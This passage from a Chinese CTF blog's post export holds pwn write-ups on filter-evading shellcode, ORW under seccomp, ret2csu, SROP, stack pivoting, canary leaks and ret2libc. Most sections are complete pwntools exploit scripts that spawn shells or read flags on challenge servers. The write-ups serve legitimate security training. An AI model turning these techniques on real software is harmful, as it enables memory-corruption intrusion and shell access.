所以通过编写汇编代码来写这段shellcode 通过异或等操作来绕过不能有00以及syscall 或 sysenter 指令汇编码的限制 脚本 12345678910111213141516171819202122232425262728293031323334from pwn import *from Crypto.Util.number import long_to_bytes, bytes_to_longcontext.log_level=&#x27;debug&#x27;context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)context.terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]ELFpath = &#x27;./pwn&#x27;p = remote(&#x27;192.168.137.1&#x27;, 40273)shellcode=&#x27;&#x27;&#x27;; // 目标: 执行 execve(&quot;/bin/sh&quot;, 0, 0) 的 syscallmov rsp, rdi #rsp指向dest（sellcode）的头部add sp, 0x0848 ; // 给 rsp 一个合法值，使程序能正常执行 push/pop，任意一个可读写段即可，我们这里刚好有rdi中存储的 shellcode 的段的起始位置，正好这个段有读写权限，就直接拿来在 0x848 偏移的位置当作栈顶了（加偏移是为了防止某些操作破坏写入的 shellcode）mov rsi, 0x4028636f2e49226fmov rdx, 0x4040104040204040xor rsi, rdxpush rsi ; // 异或搓出来&#x27;/bin/sh\\x00&#x27;(正好 8 字节，一个寄存器能存下) 并 push 到栈上面。此时 rsp 指向的即此字符串的开始位置 mov ax, 0x454fxor ax, 0x4040mov rsi, rdiadd sil, 0x40mov [rsi], ax ; // 搓出来 syscall 的机器码 0f 05 并且拼接到当前 shellcode 后面。 mov rdi, rsp ; // 设置 rdi，指向之前 push 到栈上面的 &#x27;/bin/sh\\x00&#x27;xor rsi, rsixor rdx, rdx ; // 设置 rsi, rdxxor rax, raxmov al, 59 ; // 设置 execve 的系统调用号&#x27;&#x27;&#x27;p.sendafter(&quot;Input your Code :&quot;, asm(shellcode).ljust(0x40, b&#x27;\\x90&#x27;))p.interactive() Ez_fmtInverted World 此时刚执行call read函数，因为是64位的程序参数是通过寄存器准备的 mov rsi, rax mov edx, 0x512等 这些指令是在 call _read之前执行，它们将参数值放入相应的寄存器中，所以接下来要压入read函数的返回地址 看rip的地址，应为这个是 计算距离应该填充","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"WP","slug":"WP","permalink":"http://example.com/tags/WP/"}]},{"title":"orw","slug":"orw","date":"2025-08-04T08:23:19.000Z","updated":"2025-09-02T09:34:46.729Z","comments":true,"path":"2025/08/04/orw/","permalink":"http://example.com/2025/08/04/orw/","excerpt":"","text":"orw基础orw是open、read和write三个系统调用的缩写。orw 攻击是一种绕过沙箱（Sandbox）或NX保护的技术，其核心思想是：不直接获取shell，而是通过这三个系统调用来读取目标文件（通常是flag文件），然后将其内容打印到标准输出，从而获得flag。 传统的缓冲区溢出攻击通常会尝试注入一段 shellcode，这段 shellcode 的作用是执行 execve(“&#x2F;bin&#x2F;sh”, NULL, NULL) 来获取一个交互式 shell。然而，在以下两种情况下，这种传统攻击会失败： NX（No-eXecute）保护：如果程序的栈是不可执行的，你注入的 shellcode 无法在栈上运行。 seccomp 沙箱：一些程序会使用 seccomp（安全计算模式）来限制进程可以调用的系统调用。如果 execve 被禁用，即使你成功注入了 shellcode，它也无法执行。 1open(const char *pathname, int flags，mode_t mode); pathname → 文件路径地址（放在 RDI） flags → 打开方式，比如 0 表示 O_RDONLY（放在 RSI） mode → 一般读文件不用，默认即可（放在 RDX） 1int openat(int dirfd, const char *pathname, int flags, mode_t mode); dirfd （目录文件描述符） pathname （文件路径） flags （打开方式，O_RDONLY &#x2F; O_WRONLY 等） mode （创建文件时的权限位，open 时可能不用） 12ssize_t read(int fd, void *buf, size_t count);ssize_t write(int fd, const void *buf, size_t count); fd → 文件描述符，比如 open(&quot;/flag&quot;) 的返回值 3（放在 RDI） buf → 存放&#x2F;要写 数据的缓冲区地址（放在 RSI） count → 读取&#x2F;输出 的字节数（放在 RDX） 具体的泄露有两种方法，一种是ret2syscall，用题目自己的指令去操作 还有就是shellcraft,但是它的要求会更高，因为其本质就是 shellcode，使用它要求目标内存区域必须 可写可执行（W+X） 还有一个sendfile函数,兼具了ORW中read和write的功能！ 1ssize_t sendfile(int out_fd, int in_fd, off_t *offset, size_t count); out_fd 输出文件描述符，通常是 socket（例如客户端连接的套接字）。 in_fd 输入文件描述符，通常是 打开的文件。 offset 输入文件的偏移量指针。 如果为 NULL，则使用 in_fd 当前的文件偏移量，并自动更新。 如果不为 NULL，则从指定偏移量开始读文件，但不会修改 in_fd 的偏移量。 count 希望传输的字节数。 例题基础 这个就是典型的orw 用 1seccomp-tools dump ./orw #查看允许的函数调用 脚本123456789101112131415from pwn import *r = remote(&#x27;node5.buuoj.cn&#x27;,29475)context.log_level = &#x27;debug&#x27;elf = ELF(&#x27;orw&#x27;)shellcode = shellcraft.open(&#x27;/flag&#x27;)shellcode += shellcraft.read(&#x27;eax&#x27;,&#x27;esp&#x27;,100)shellcode += shellcraft.write(1,&#x27;esp&#x27;,100)shellcode = asm(shellcode)r.sendline(shellcode)r.interactive() [HGAME 2023 week1]orw题目 可以看到禁了execve和execveat 思路：先泄露libc基地址，(可以看到read读入的数量比较大，所以可以把泄露puts的写入rop链后面) 之后lea把read的读入位置劫持道我们对应的bss位置，之后在这里放入orw的绕过，最后leave跳转过去让它执行就可以了 脚本12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364from pwn import *import sysfrom LibcSearcher import *file_path = &quot;./vuln&quot;remote_host = &quot;node5.anna.nssctf.cn&quot;remote_port = 25492libc=ELF(&quot;./libc-2.31.so&quot;)context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(file_path)if &#x27;re&#x27; in sys.argv: p = remote(remote_host, remote_port)else: p = process(file_path) # gdb.attach(p, &quot;b*0x4012EE&quot;)def sla(a, b): p.sendlineafter(a, b)def ru(a): p.recvuntil(a)def sa(a, b): p.sendafter(a, b)puts_got=elf.got[&quot;puts&quot;]puts_plt=elf.plt[&quot;puts&quot;]lea=0x4012CF ret=0x4012EF rdi=0x401393bss=0x404300 rbp=0x40117dmain=0x4012F0 leave=0x4012EE pay=b&quot;a&quot;*0x108+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)sa(b&quot;Maybe you can learn something about seccomp, before you try to solve this task.\\n&quot;, pay)puts=u64(p.recvuntil(b&quot;\\x7f&quot;)[-6:]+b&quot;\\x00\\x00&quot;)print(b&quot;puts===========================&quot;+hex(puts).encode())libc_base=puts-libc.sym[&quot;puts&quot;]rdx = libc_base + 0x142c92 rsi = libc_base + 0x2601f open=libc_base+libc.sym[&quot;open&quot;]read=libc_base+libc.sym[&quot;read&quot;]write=libc_base+libc.sym[&quot;write&quot;]pay=b&quot;a&quot;*0x100+p64(bss+0x400)+p64(lea)p.recvuntil(&#x27;Maybe you can learn something about seccomp, before you try to solve this task.&#x27;)p.send(pay)pause()pay=b&quot;/flag\\x00\\x00\\x00&quot;pay+=p64(rdi)+p64(bss+0x300)+p64(rsi)+p64(0)+p64(open)pay+=p64(rdi)+p64(3)+p64(rsi)+p64(bss+0x300)+p64(rdx)+p64(0x100)+p64(read)pay+=p64(rdi)+p64(1)+p64(rsi)+p64(bss+0x300)+p64(rdx)+p64(0x100)+p64(write)pay=pay.ljust(0x100,b&#x27;\\x00&#x27;)+p64(bss+0x300)+p64(leave) p.send(pay)p.interactive() XYCTF orw rsp只想一个新的栈空间，而且这个地方是由rdi控制的，我们构造的rop链无法使用，所以只能自己手搓汇编 果然汇编代码才是一切的基础:candle: 1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import *context(log_level=&#x27;debug&#x27;, arch = &quot;amd64&quot;,os= &#x27;linux&#x27;,terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;])p = process(&#x27;./vuln&#x27;)#p = remote(&quot;xyctf.top&quot;,60030 )libc =ELF(&quot;./libc.so.6&quot;)elf = ELF(&#x27;./vuln&#x27;)def convert_str_asmencode(content: str): out = &quot;&quot; for i in content: out = hex(ord(i))[2:] + out out = &quot;0x&quot; + out return out #将str转换为十六进制数，并在开头补上&quot;0x&quot;if p.recvline()==b&#x27;show your magic again\\n&#x27;: shellcode=f&quot;&quot;&quot; xor rsi,rsi; mov rbx,&#123;convert_str_asmencode(&quot;/flag&quot;)&#125;; push rbx; mov rdx,0; #设置oflag为0 mov r10,0; mov rdi,3; #文件描述符3 mov rsi,rsp mov eax,257; #openat的系统调用号 syscall; mov rsi,3; #in_fd mov r10,50; #n_bytes xor rdx,rdx; mov rdi,rdx; inc rdi; #out_fd mov eax,40; #sendfile的系统调用号 syscall; mov rdi,0; mov rax,60; #exit syscall &quot;&quot;&quot; payload1 =asm(shellcode) p.send(payload1) p.interactive() 本篇参考了师傅Dusk的博客","categories":[{"name":"exercise_pwn","slug":"exercise-pwn","permalink":"http://example.com/categories/exercise-pwn/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"},{"name":"orw","slug":"orw","permalink":"http://example.com/tags/orw/"}]},{"title":"libc版本切换","slug":"libc环境切换","date":"2025-08-02T10:43:25.000Z","updated":"2025-08-26T09:11:04.829Z","comments":true,"path":"2025/08/02/libc环境切换/","permalink":"http://example.com/2025/08/02/libc%E7%8E%AF%E5%A2%83%E5%88%87%E6%8D%A2/","excerpt":"","text":"更换libc版本首先要拿到对应的libc.so文件 然后查看版本 1strings libc文件名 |grep ubuntu 然后切换clibc版本 1libc 文件名 libc版本信息 查看libc版本通过got表泄露libc版本 输出一个外置函数的got表地址 然后在网站匹配之后下载 下载没有的libc文件 1https://launchpad.net/ubuntu/+source/glibc/&lt;libc版本&gt; ##例如2.31-0ubuntu9.9 把这两个文件下载到glibc-all-in-one中的debs 然后去执行 12./extract debs/libc6_2.35-0ubuntu3.10_amd64.deb libs/2.35-0ubuntu3.10_amd64./extract debs/libc6-dbg_2.35-0ubuntu3.10_amd64.deb libs/2.35-0ubuntu3.10_amd64/.debug 然后把解压出来的东西放在对应的libc文件处就可以了 我的路径是File System&#x2F;&#x2F;lib&#x2F;freelibs&#x2F;对应文件夹","categories":[{"name":"pwn_study","slug":"pwn-study","permalink":"http://example.com/categories/pwn-study/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"}]},{"title":"ciscn_2019_s_3","slug":"ciscn-2019-s-3","date":"2025-08-02T07:50:19.000Z","updated":"2025-09-09T06:11:29.088Z","comments":true,"path":"2025/08/02/ciscn-2019-s-3/","permalink":"http://example.com/2025/08/02/ciscn-2019-s-3/","excerpt":"","text":"题目 没有后门函数，也没有能用来泄露libc地址的东西 但是看到有execve和一些对寄存器的操作，考虑csu 在栈上写入&#x2F;bin&#x2F;sh,之后调用它 数据在栈的位置不是固定的，但是偏移是固定的 可以通过read和write来泄露栈上的地址 scu泄露地址 buf的起始位置是0x7fffffffdd70，70到80之间是buf的16空间 栈上0x7fffffffdd90对应的数据是一个栈 上的地址所以选择读取这个位置的地址 并计算出它和buf之间的偏移以精准定位buf的头部 且 这个函数返回时直接ret，没有进行pop ebp的操作，所以在构造payload的时候不需要覆盖ebp 脚本 123456payload=b&quot;a&quot;*16+p64(vuln)p.sendline(payload)p.recv(32)place=u64(p.recv(8))bin_sh=place-0x118print(hex(bin_sh)) 调用64位时，设计后门函数需要rax&#x3D;59（#define__NR_execve 59）;rdi&#x3D;”&#x2F;bin&#x2F;sh”;rsi&#x3D;0;rdx&#x3D;0; rax&#x3D;59地址已经找到了 ROPgadgets命令查看，发现只有对rdi和rsi的s操作 剩下的就是基本的csu了 123456rbx_rbp_r12_r13_r14_r15#r13&gt;rdx r14&gt;rsi r15&gt;edi#call r12+rbx*8#add rbx, 1#cmp rbx, rbp 设置好rdx、rsi、rdi，然后调用 syscall 首先r14和r13一定要赋值为0，而且r15d的值 函数会跳转到r12+rbx*8,让它最后修改rdi然后执行调用syscall，所以r12要赋值为payload中的pop rdi的地方，rbx赋值0 且只调用一次 所以rbp&#x3D;1 最终执行 12mov rax, 59 ; syscall number for execvesyscall 脚本 123456payload = b&#x27;/bin/sh\\x00&#x27; + b&#x27;b&#x27;*8 + p64(pop6)payload += p64(0)*2 + p64(bin_sh + 0x50) + p64(0)*3payload += p64(mov) + p64(rax)payload += p64(rdi) + p64(bin_sh) + p64(syscall)p.sendline(payload)p.interactive() 注意 ✅ mov edi, r15d和 rdi 的关系 1mov edi, r15d 只看语法，是： 把 r15d的值（32 位）赋给 edi（也是 32 位） 但这里有个关键点： 在 x86-64 架构中，对 rdi 的低 32 位写入（edi）时，高 32 位会被清零！ 🔍 举个例子 12mov rdi, 0x4141414141414141mov edi, 0x42424242 执行完第二条指令后，rdi的值是： 1rdi == 0x0000000042424242 也就是说： 写 edi 相当于先清空 rdi，再写低 32 位 mov edi, r15d其实等价于： 1rdi = r15 &amp; 0xffffffff 所以你能用它来设置 rdi 的值前提是你设置的 r15 是一个 32 位以内的地址（或者值），比如 &#x2F;bin&#x2F;sh 的地址必须低于 0x100000000，否则会丢高位，导致 execve 崩溃或 syscall 参数错误 所以要之后再放设置rdi的值 脚本1234567891011121314151617181920212223242526272829303132from pwn import *#p=process(&quot;./ciscn_s_3&quot;)p=remote(&quot;node5.buuoj.cn&quot;,28493)syscall=0x400517vuln=0x4004EDrdi=0x4005a3rax=0x4004E2pop6=0x40059A#rbx_rbp_r12_r13_r14_r15mov=0x400580#r13&gt;rdx r14&gt;rsi r15&gt;edi #call r12+rbx*8 #add rbx, 1 #cmp rbx, rbp payload=b&quot;a&quot;*16+p64(vuln)p.sendline(payload)p.recv(32)place=u64(p.recv(8))bin_sh=place-0x118print(hex(bin_sh))payload = b&#x27;/bin/sh\\x00&#x27; + b&#x27;b&#x27;*8 + p64(pop6)payload += p64(0)*2 + p64(bin_sh + 0x50) + p64(0)*3payload += p64(mov) + p64(rax)payload += p64(rdi) + p64(bin_sh) + p64(syscall)p.sendline(payload)p.interactive() SROP 题目中也有sigframe SROP 攻击的原理 内核保存上下文（步骤 ①）：当程序接收到信号时，内核会暂停程序的执行，并自动将当前所有寄存器（rax, rdi, rsi, rdx, rip, rsp 等）的状态保存到一个特殊的结构体中，这个结构体叫做 sigcontext。然后，内核将这个 sigcontext 压入栈中，为执行信号处理函数做准备。 攻击者伪造上下文：攻击者利用栈溢出漏洞，在程序接收信号之前，就向栈中写入一个伪造的 sigcontext 结构体。这个伪造的结构体中包含了攻击者想要设置的所有寄存器值。例如，你可以把 rip 设置为 execve 的地址，把 rdi 设置为 /bin/sh 字符串的地址。 触发 sigreturn 系统调用：攻击者通过构造 ROP 链，使程序执行流跳转到一个能够执行 sigreturn 系统调用的 gadget。sigreturn 是一个特殊的系统调用，它的功能就是从栈中读取 sigcontext 结构体，并恢复寄存器状态。攻击者通常会找到一个 mov rax, 0xf; syscall; 这样的 gadget，其中 0xf 是 sigreturn 系统调用的编号。 内核恢复上下文（步骤 ③）：当 syscall 执行后，内核会发现 rax 的值为 0xf，便会执行 sigreturn。正如你所说，内核在执行这一步时不会去校验栈上数据的合法性。它会盲目地信任栈上的数据，从栈顶读取我们伪造的 sigcontext 结构体，并用里面的值来恢复所有的寄存器。 劫持程序执行流（步骤 ④）：由于我们已经将伪造的 sigcontext 中的 rip 设置为 execve 的地址，rdi 设置为 /bin/sh 的地址，程序恢复寄存器后，会立即跳转到 execve 函数执行，并以 /bin/sh 作为参数，最终获得一个 Shell。 脚本123456789101112131415161718192021222324252627282930from pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;] p=remote(&quot;node5.buuoj.cn&quot;,27869)syscall_ret = 0x0400517data = 0x0601020mov_rax_0xf = 0x4004DA#两次Sigreturn，第一次输入/bin/sh\\x00#第二次执行execve(&quot;/bin/sh&quot;,0,0)vuln = 0x04004ED payload = b&#x27;/bin/sh\\x00&#x27; + b&#x27;a&#x27;*8 + p64(vuln)p.send(payload)p.recv(0x20)bin_sh = u64(p.recv(8)) - 280print(&quot;bin_sh_addr =================== &quot;,hex(bin_sh)) #第二次Sigreturnpayload = [ b&#x27;/bin/sh\\x00&#x27;,b&#x27;a&#x27;*0x8,mov_rax_0xf,syscall_ret]#先设计rax的值，然后syscall去触发这个frame = SigreturnFrame()frame.rax = 59frame.rdi = bin_shframe.rsi = 0frame.rdx = 0frame.rip = syscall_retpayload.append(bytes(frame))p.sendline(flat(payload))p.interactive()","categories":[{"name":"exercise_pwn","slug":"exercise-pwn","permalink":"http://example.com/categories/exercise-pwn/"}],"tags":[{"name":"gdb","slug":"gdb","permalink":"http://example.com/tags/gdb/"},{"name":"csu","slug":"csu","permalink":"http://example.com/tags/csu/"},{"name":"SROP","slug":"SROP","permalink":"http://example.com/tags/SROP/"},{"name":"stack","slug":"stack","permalink":"http://example.com/tags/stack/"}]},{"title":"栈迁移","slug":"栈迁移","date":"2025-08-01T07:14:49.000Z","updated":"2025-09-02T01:47:50.664Z","comments":true,"path":"2025/08/01/栈迁移/","permalink":"http://example.com/2025/08/01/%E6%A0%88%E8%BF%81%E7%A7%BB/","excerpt":"","text":"基础两个对buf的输入pwn75 位置不够，且有system函数但没有“&#x2F;bin&#x2F;sh”字符串 思路泄露ebp的地址，然后gdb调试找到buf开头和ebp之间的偏移以找到buf的位置 之后通过第二次输入对调用system函数，并在payload中传入字符串“&#x2F;bin&#x2F;sh\\x00”，之后通过这个函数的ret让程序返回到buf开头处执行后门函数 差是0x38 脚本123456789101112131415161718192021222324252627from pwn import *context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)#p = process(&#x27;./pwn75&#x27;)p = remote(&#x27;pwn.challenge.ctf.show&#x27;,28124)p.recvuntil(b&quot;codename:&quot;)payload=b&quot;a&quot;*0x24+b&quot;1234&quot;p.send(payload)p.recvuntil(b&quot;1234&quot;)ebp = u32(p.recv(4))print(hex(ebp))leave=0x080486ACsystem=0x08048400main=0x08048768off=0x38buf=ebp-offp.recvuntil(b&quot;want to do?&quot;)payload=p32(system)+p32(main)+p32(buf+12)+b&quot;/bin/sh\\x00&quot;payload=payload.ljust(0x28,b&quot;a&quot;)payload+=p32(buf-4)+p32(leave)p.sendline(payload)p.interactive() 1payload=p32(system)+p32(main)+p32(buf+12)+b&quot;/bin/sh\\x00&quot; 把&#x2F;bin&#x2F;sh字符段通过payload放入栈上，之后再system函数的的参数位置放置&#x2F;bin&#x2F;sh字符串的位置 12345payload=b&quot;a&quot;*0x24+b&quot;1234&quot;p.send(payload)p.recvuntil(b&quot;1234&quot;)ebp = u32(p.recv(4))print(hex(ebp)) 注意sendline会在发送payload之后再发送一个&#x2F;n 会影响接收数据 一个s一个buf[Black Watch 入群题]PWN 没有system函数 思路通过s设置rop链泄露got表地址，之后返回main函数继续执行，buf返回s去执行rop链 通过泄露的got表地址得到system的需要信息，构造后门函数 在s放置构造好的后门函数，通过buf让函数进入执行 脚本1234567891011121314151617181920212223242526272829303132333435363738394041from pwn import *from LibcSearcher import *context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)#p= process(&#x27;./spwn&#x27;)p= remote(&quot;node5.buuoj.cn&quot;,28120)elf=ELF(&quot;./spwn&quot;)#gdb.attach(p,&quot;b *0x08048511&quot;)#bss=elf.bss()s=0x0804A300write_plt=elf.plt[&#x27;write&#x27;]write_got=elf.got[&#x27;write&#x27;]main=0x8048513leave=0x08048511payload=p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(4)p.recvuntil(b&quot;What is your name?&quot;)p.send(payload)p.recvuntil(b&quot;What do you want to say?&quot;)payload1=b&quot;a&quot;*24+p32(s-4)+p32(leave)p.send(payload1)write=u32(p.recv(4))print(hex(write))libc=LibcSearcher(&quot;write&quot;,write)libc_base=write-libc.dump(&#x27;write&#x27;)system=libc_base+libc.dump(&#x27;system&#x27;)sh=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)payload=p32(system)+p32(0)+p32(sh)p.recvuntil(b&quot;What is your name?&quot;)p.send(payload)p.recvuntil(b&quot;What do you want to say?&quot;)p.send(payload1)p.interactive() 注意:返回地址必须写main的地址 在 vul_function 函数中，程序会在栈上创建一个名为buf 的缓冲区。 如果你的 ROP 链没有回到 main，而是直接回到 vul_function，那么 vul_function 在重新执行时会再次创建栈帧，这可能会影响你第一次泄漏后在 .bss 区域布置的 ROP 链。 main 函数的结构非常简单，它只调用 vul_function，因此它的栈帧非常稳定，不会干扰 bss 段中的数据。 当vul_function函数可以正常返回的时候，它的栈帧会被清理而不影响下一步 进阶canary+迁移附件 输入的最远位置只到ret的地址，而且没有system函数，所以要栈迁移 而且有canary泄露 所以接收buf的地址之后，通过printf的输出泄露canary,然后在buf上布置泄露libc的函数(返回地址写main),让函数跳转过去执行之后泄露，之后用泄露libc基地址去拿到shell 初始时操作系统为程序分配了内存，其中就包括初始栈空间（buf),之后栈迁移跳转到buf段，再次进入main函数，程序在这里再次创建栈帧，所以输出的buf的地址会发生变化，要重新接收地址 脚本12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364from pwn import *import sysfrom LibcSearcher import *file_path = &quot;./111&quot;remote_host = &quot;node4.anna.nssctf.cn&quot;remote_port = 28483context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(file_path)if &#x27;re&#x27; in sys.argv: p = remote(remote_host, remote_port)else: p = process(file_path) #gdb.attach(p, &quot;b*0x04012D7&quot;)p.recvuntil(b&quot;Before you start to attack, I give you a small gift\\n&quot;)p.recvuntil(b&quot;0x&quot;)buf=int(p.recv(12),16)print(b&quot;buf==============&quot;+hex(buf).encode())puts_plt=elf.plt[&#x27;puts&#x27;]read_got=elf.got[&#x27;read&#x27;]main=0x40120Aleave=0x4012D7 rdi=0X401205ret=0X40101apayload1 = b&#x27;a&#x27; *0x28+ b&#x27;b&#x27;p.send(payload1)p.recvuntil(b&#x27;b&#x27;)canary = u64(p.recv(7).rjust(8, b&#x27;\\00&#x27;))print(f&quot;canary -------------------:&#123;hex(canary)&#125;&quot;)pay=p64(rdi) + p64(read_got) + p64(puts_plt)+ p64(ret)+p64(main)+ p64(canary)+p64(buf-8)+p64(leave)p.recvuntil(b&quot;The last read??&quot;)p.send(pay)read= u64(p.recvuntil(&quot;\\x7f&quot;)[-6:] + b&#x27;\\0\\0&#x27;)print(f&quot;read: &#123;hex(read)&#125;&quot;)libc = LibcSearcher(&quot;read&quot;, read)libc_base = read - libc.dump(&quot;read&quot;)system= libc_base + libc.dump(&#x27;system&#x27;)bin= libc_base + libc.dump(&#x27;str_bin_sh&#x27;)print(b&quot;base=============&quot;+hex(libc_base).encode())# rsi=libc_base+0x2be51# rdx=libc_base+0xa5722p.recvuntil(b&quot;0x&quot;)buf=int(p.recv(12),16)print(b&quot;buf==============&quot;+hex(buf).encode())p.send(b&#x27;a&#x27;)pay=p64(rdi)+p64(bin)+p64(system)+b&quot;a&quot;*0x10+p64(canary) + p64(buf- 0x8) + p64(leave)p.recvuntil(b&quot;The last read??&quot;)p.sendline(pay)p.interactive() 收获 代表栈不平衡 lea_read附件 可以看到没有泄露地址的机会，但是read本身的比较特殊 read的读入地址是存储的是buf的地址，但是实际是按照其相对于rbp的偏移来确定的，所以我们可以把rbp赋值为我们要写入的地址+buf的off,之后把ret的地址覆盖为 lea rax, [rbp+buf]的地址，这里主要是因为后面会有赋值把rax的数值赋值给rdi，以实现后期的read读入地址的改变，已经read函数的调用 这里我们可以让函数跳转到bss段，但是注意bss段头部通常会存放一些程序初始化时使用的全局变量。为了避免覆盖这些重要数据，通常会将栈迁移的地址稍微往后移动一些，留出足够的空间。 一个对攻击有用的 lea 指令要满足： 计算出的地址依赖你能控制的基址（如 rbp）； 结果寄存器会传递到函数参数里（如 rsi, rdi）； 后续函数调用（如 read, puts）会真的使用这个地址； 不要有副作用破坏攻击环境。 .bss 段是一个未初始化的数据段，它的大小通常在编译时确定，但其中的大部分空间可能没有被任何已知的变量占用。 IDA 显示了 .bss 段从 0x404040 开始，到 0x404069 结束，这表示在这个范围内，IDA 找到了已知的符号（如stdin、stderr等）。 然而，这并不意味着 .bss 段只到 0x404069。程序的 .bss 段的实际大小可以在 ELF 文件的头部信息中找到。通常情况下，.bss 段会比 IDA 显示的已知符号范围大得多。 简单来说，IDA 就像一个图书馆目录，只列出了有名字的书（符号），但并不会把所有空书架（未使用的地址）都一一列出来。可以在任何空书架上放置你的东西，只要它属于这个图书馆（.bss 段）即可。 栈迁移的目标地址必须满足两个条件： 可写： 该内存区域必须是可写的，因为我们要把伪造的ROP链写入到这个位置。bss段就是可写的。 不被占用： 该区域不能被程序当前使用的其他数据（如全局变量）占用，否则会覆盖数据，导致程序崩溃。 之所以选择bss段，是因为它在程序运行期间通常是未被初始化的，因此可以安全地用于存放我们的ROP链。而使用0x405000（或者脚本中的0x404500），可能是为了避免与bss段起始处的全局变量发生冲突，因为bss段的起始部分可能被用来存储一些未初始化的全局变量。 所以我们构造的时候尽量开一个新页，选择一个页对齐的地址，或者至少是一个较大的、远离已知数据的偏移地址。.bss 段的首地址通常被程序用来存放一些重要的全局变量。 脚本12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364from pwn import *import sysfrom LibcSearcher import *file_path = &quot;./222&quot;remote_host = &quot;node4.anna.nssctf.cn&quot;remote_port = 28483context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(file_path)if &#x27;re&#x27; in sys.argv: p = remote(remote_host, remote_port)else: p = process(file_path) #gdb.attach(p, &quot;b*0x401211&quot;)def sla(a, b): p.sendlineafter(a, b)def ru(a): p.recvuntil(a)def sa(a, b): p.sendafter(a, b) bss=0x404500main=0x4011DB rdi=0x401225leave=0x40121Bread=0x401200rbp=0x40115dputs_plt=elf.plt[&quot;puts&quot;]puts_got=elf.got[&quot;puts&quot;]ret=0x40101apay1=b&quot;a&quot;*0x50+p64(bss+0x50)+p64(read)sa(b&quot;Xswlhhh!Use stack hijacking on him!&quot;,pay1)pay=p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(rbp)+p64(bss+0x200+0x50)+p64(read)pay=pay.ljust(0x50,b&quot;a&quot;)+p64(bss-8)+p64(leave)p.send(pay)puts = u64(p.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8, b&#x27;\\x00&#x27;))print(b&quot;puts===========&quot;+hex(puts).encode())libc=LibcSearcher(&quot;puts&quot;,puts)libc_base=puts-libc.dump(&quot;puts&quot;)print(b&quot;libc_base===========&quot;+hex(libc_base).encode())system=libc_base+libc.dump(&quot;system&quot;)bin=libc_base+libc.dump(&quot;str_bin_sh&quot;)print(b&quot;system===========&quot;+hex(system).encode())print(b&quot;bin===========&quot;+hex(bin).encode())payload=p64(ret)+p64(rdi)+p64(bin)+p64(ret)+p64(system)payload=payload.ljust(0x50,b&quot;\\x00&quot;)payload+= p64(bss+0x200)+p64(leave)p.send(payload)p.interactive() 收获 调用system函数会压栈，所以这个地址也要抬高，确保它是在rw-p权限段 在没有抬高栈地址的时候 此时权限不够","categories":[{"name":"pwn_study","slug":"pwn-study","permalink":"http://example.com/categories/pwn-study/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"},{"name":"栈迁移","slug":"栈迁移","permalink":"http://example.com/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/"}]},{"title":"[2021 鹤城杯]littleof","slug":"2021-鹤城杯-littleof","date":"2025-07-31T07:43:25.000Z","updated":"2025-09-03T10:57:20.415Z","comments":true,"path":"2025/07/31/2021-鹤城杯-littleof/","permalink":"http://example.com/2025/07/31/2021-%E9%B9%A4%E5%9F%8E%E6%9D%AF-littleof/","excerpt":"","text":"题目 开启了canary保护 所以用printf泄露canary的数值 之后用ret2libc的方法解决 脚本12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *from LibcSearcher import *context.log_level = &#x27;debug&#x27;#p = process(&#x27;./littleof&#x27;)p = remote(&#x27;node4.anna.nssctf.cn&#x27;, 28230)elf = ELF(&quot;./littleof&quot;)# canary泄露payload1 = b&#x27;a&#x27; * (0x50 - 0x8) + b&#x27;b&#x27;p.recvuntil(b&#x27;Do you know how to do buffer overflow?\\n&#x27;)p.send(payload1)p.recvuntil(b&#x27;b&#x27;)canary = u64(p.recv(7).rjust(8, b&#x27;\\00&#x27;))print(f&quot;canary :&#123;hex(canary)&#125;&quot;)# ret2libcrdi = 0x400863ret = 0x40059eputs_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]main = 0x400789payload2 = b&#x27;a&#x27; *0x48 + p64(canary)payload2+= p64(0) + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(main)p.sendline(payload2)p.recvuntil(b&#x27;I hope you win\\n&#x27;)puts_addr = u64(p.recvuntil(b&#x27;\\n&#x27;)[:-1].ljust(8, b&#x27;\\00&#x27;))print(f&quot;puts_addr: &#123;hex(puts_addr)&#125;&quot;)libc = LibcSearcher(&#x27;puts&#x27;, puts_addr)libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)system_addr = libc_base + libc.dump(&#x27;system&#x27;)bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)#gdb.attach(p,&quot;b *0x0000000000400787&quot;)payload3 = b&#x27;a&#x27; * (0x50 - 0x8) + p64(canary) + p64(0)payload3+=p64(ret)+ p64(rdi) + p64(bin_sh) + p64(system_addr)p.sendline(payload3)p.interactive() 1canary = u64(p.recv(7).rjust(8, b&#x27;\\00&#x27;)) 此时读取的还是小端序。所以在左侧补位\\x00 